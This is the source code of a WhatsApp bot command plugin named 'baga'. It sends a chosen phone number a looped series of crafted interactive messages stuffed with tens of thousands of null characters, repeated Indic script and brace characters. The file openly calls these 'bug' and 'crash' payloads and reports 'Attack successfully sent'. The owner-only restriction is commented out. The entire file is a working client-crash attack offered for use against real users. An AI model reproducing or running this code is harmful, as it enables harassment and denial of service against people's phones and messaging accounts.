const { cmd } = require('../command');
const config = require('../config');
const os = require("os");
const { runtime } = require('../lib/functions');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

// ---------------------- Helper ---------------------- //
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ====================== BUG FUNCTIONS ====================== //

async function RizzKenok(target, conn) {
    const bug_char = "జ్ఞ‌ා".repeat(15000);
    const crash_val = "\u0000".repeat(50000); // Reduced for stability
    await conn.relayMessage(target, {
        viewOnceMessageV2: {
            message: {
                interactiveMessage: {
                    header: { title: "🩸", hasMediaAttachment: false },
                    body: { text: "⌁⃰ *SYSTEM OVERLOAD* \n" + bug_char },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "payment_method", buttonParamsJson: crash_val },
                            { name: "single_select", buttonParamsJson: crash_val }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        forwardingScore: 999,
                        isForwarded: true
                    }
                }
            }
        }
    }, { participant: { jid: target } });
}

async function InvisibleFC(target, conn) {
    let message = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "⚠️ CRASH SYSTEM ⚠️",
                        hasMediaAttachment: false,
                    },
                    body: { text: "System Lagging..." },
                    nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
                    contextInfo: { participant: target, mentionedJid: [target] },
                },
            },
        },
    };
    await conn.relayMessage(target, message, { participant: { jid: target } });
}

// ====================== COMMAND HANDLER ====================== //

cmd({
    pattern: "baga",
    alias: ["bugsystem", "crash-v2"],
    react: "🩸",
    desc: "Extreme system bug / crash command.",
    category: "main",
    filename: __filename
},
async (robin, mek, m, { from, text, reply, sender, isOwner }) => {
    try {
        // Target එක තෝරා ගැනීම (Mentioned, Quoted හෝ Number)
        let target = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : (m.quoted ? m.quoted.sender : (text ? text.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : null));

        if (!target) {
            return reply("❌ *කරුණාකර Target එකක් Mention කරන්න හෝ අංකය ලබා දෙන්න!*");
        }

        // ආරක්ෂාව සඳහා Owner ට පමණක් මෙය ලබා දීම නිර්දේශ කෙරේ
        // if (!isOwner) return reply("🔒 This is an owner-only powerful command!");

        const uptimeStr = runtime(process.uptime());
        const statusText = `╭─〔 *☣️ BUG ATTACK ☣️*〕─◉
│
│🎯 *Target*: ${target.split('@')[0]}
│⏰ *Bot Uptime*: ${uptimeStr}
│⚡ *Status*: Sending Exploits...
╰─────────────────────────────⊷
> © 𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝐌𝗗 🌛`;

        // මුලින්ම විස්තරය යැවීම
        await robin.sendMessage(from, { text: statusText }, { quoted: mek });

        // Bug එක යැවීම (මෙහිදී loops ගණන අඩු කර ඇත්තේ බෝට් එක crash වීම වැළැක්වීමටයි)
        for (let i = 0; i < 5; i++) {
            await InvisibleFC(target, robin);
            await sleep(2000);
            await RizzKenok(target, robin);
            console.log(`Bug sent to: ${target} - Loop: ${i+1}`);
        }

        await robin.sendMessage(from, { react: { text: "✅", key: mek.key } });
        reply(`✅ *Attack successfully sent to ${target.split('@')[0]}*`);

    } catch (e) {
        console.error("Baga Cmd Error:", e);
        reply(`⚠️ Error: ${e.message}`);
    }
});
